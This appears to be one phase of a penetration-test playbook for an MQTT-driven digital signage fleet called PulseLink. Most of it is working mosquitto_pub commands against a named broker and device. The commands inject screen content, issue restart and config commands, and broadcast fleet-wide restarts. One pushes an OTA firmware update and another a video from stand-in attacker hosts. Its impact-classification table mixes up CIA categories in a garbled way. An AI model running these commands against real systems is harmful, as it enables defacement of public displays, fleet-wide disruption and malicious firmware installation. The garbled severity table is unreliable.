# Phase 4: Content Injection via MQTT

**Objective:** Demonstrate the ability to inject content and commands into the PulseLink messaging system by publishing to authenticated MQTT topics.

## Prerequisites

- Successful MQTT broker authentication from Phase 3
- Confirmed topic structure from Phase 3 enumeration
- `mosquitto-clients` installed (`mosquitto_pub`)
- Certificates: `ca.crt`, `client_pi_generic.crt`, `client_pi_generic.key`

## Attack Scenarios

This phase tests three escalating impact scenarios:

1. **Content Manipulation** — Change what displays on the screen
2. **Command Injection** — Execute device commands (restart, update, etc.)
3. **Fleet-Wide Broadcast** — Affect all devices simultaneously

## TEST 1: Content Manifest Injection (PII Impact)

PulseLink displays content based on manifests published to device topics. If we can publish to the content topic, we control what appears on the screen.

```bash
# Create a test manifest
cat > test_manifest.json << 'EOF'
{
  "test_content.mp4": {
    "seq": 1,
    "duration": 60,
    "isFullScreen": true
  }
}
EOF

# Publish to the device-specific content topic
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/content" \
  -f test_manifest.json
```

**Expected outcomes:**
| Result | Meaning |
|--------|---------|
| No error, message accepted | **CRITICAL** — Content injection successful |
| "Access denied" or connection drop | Topic has publish ACL restriction |
| Message accepted but no effect | Topic is valid but content format incorrect |

### If content injection succeeds:

**Real-world impact:**
- Display unauthorized content on public signage
- Replace advertisements, directions, or informational displays
- Show phishing pages, malware download QR codes, or offensive content
- Affects any display visible to the public or staff

### Escalated payload example:

```bash
# Demonstrate: Replace content with a custom message
cat > malicious_manifest.json << 'EOF'
{
  "hacked.mp4": {
    "seq": 1,
    "duration": 300,
    "isFullScreen": true,
    "url": "http://attacker-controlled.example.com/payload.mp4"
  }
}
EOF

mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/content" \
  -f malicious_manifest.json
```

## TEST 2: Command Injection (CII Impact)

```bash
# Attempt device restart
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/command" \
  -m '{"action":"restart"}'

# Attempt configuration change
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/command" \
  -m '{"action":"update_config","settings":{"brightness":0,"volume":0}}'

# Attempt firmware update trigger
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "device/882985e065594198/command" \
  -m '{"action":"ota_update","url":"http://attacker.example.com/firmware.bin"}'
```

**Command topics to test:**
| Topic Pattern | Potential Commands |
|--------------|-------------------|
| `device/+/command` | restart, shutdown, update |
| `device/+/cmd` | Shorter alias |
| `device/+/control` | General device control |
| `device/+/settings` | Configuration changes |

## TEST 3: Fleet-Wide Broadcast (PFI Impact)

```bash
# Fleet broadcast message
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "fleet/broadcast" \
  -m '{"alert":"test from external client","timestamp":"2024-03-17T17:00:00Z"}'

# Fleet-wide content change
cat > fleet_manifest.json << 'EOF'
{
  "fleet_override.mp4": {
    "seq": 1,
    "duration": 600,
    "isFullScreen": true
  }
}
EOF

mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "fleet/content" \
  -f fleet_manifest.json

# Fleet-wide command
mosquitto_pub -h pulse.n-compass.online -p 8883 \
  --cafile ca.crt \
  --cert client_pi_generic.crt \
  --key client_pi_generic.key \
  -t "fleet/command" \
  -m '{"action":"restart_all"}'
```

### Why Fleet-Wide Matters

If `fleet/#` topics accept publish messages:
- **One compromise affects every display in the fleet**
- Could be dozens, hundreds, or thousands of screens
- Mass defacement, misinformation delivery, or service disruption
- Real-world parallel: 2023 Dallas airport display hack

## TEST 4: Topic Fuzzing for Additional Write Access

```bash
# Try variations of content/command topics
for topic_suffix in content cmd command control settings update override; do
  echo "Testing: device/882985e065594198/$topic_suffix"
  mosquitto_pub -h pulse.n-compass.online -p 8883 \
    --cafile ca.crt \
    --cert client_pi_generic.crt \
    --key client_pi_generic.key \
    -t "device/882985e065594198/$topic_suffix" \
    -m '{"test":true}' -q 1
done

# Try with different QoS levels
for qos in 0 1 2; do
  mosquitto_pub -h pulse.n-compass.online -p 8883 \
    --cafile ca.crt \
    --cert client_pi_generic.crt \
    --key client_pi_generic.key \
    -t "device/882985e065594198/content" \
    -m '{"test":true}' -q $qos
  echo "QoS $qos result: $?"
done
```

## Results Documentation

| Test | Topic | Accepted? | Observable Effect |
|------|-------|-----------|-------------------|
| Content inject | device/+/content | | |
| Command inject | device/+/command | | |
| Fleet broadcast | fleet/broadcast | | |
| Fleet content | fleet/content | | |
| Fleet command | fleet/command | | |

## Impact Classification

| Finding | CIA Triad | Severity |
|---------|-----------|----------|
| Can inject content to one device | **P** (P Integrity) | **HIGH** |
| Can inject content to fleet | **P** (P Integrity, PFI) | **CRITICAL** |
| Can issue device commands | **C** (CIA - Confidentiality) | **HIGH** |
| Can issue fleet commands | **C** (CIA - PFI) | **CRITICAL** |
| No publish access | N/A | MEDIUM (read-only access still valuable) |

## Cleanup

After testing, if content was injected:

```bash
# Restore original content (if known)
# Attempt to undo any changes by publishing the legitimate manifest
# Document the rollback process for the report
```

**Next phase:** `phase5-replay-evidence.md` — Capture and document all exploitation traffic as forensic evidence.
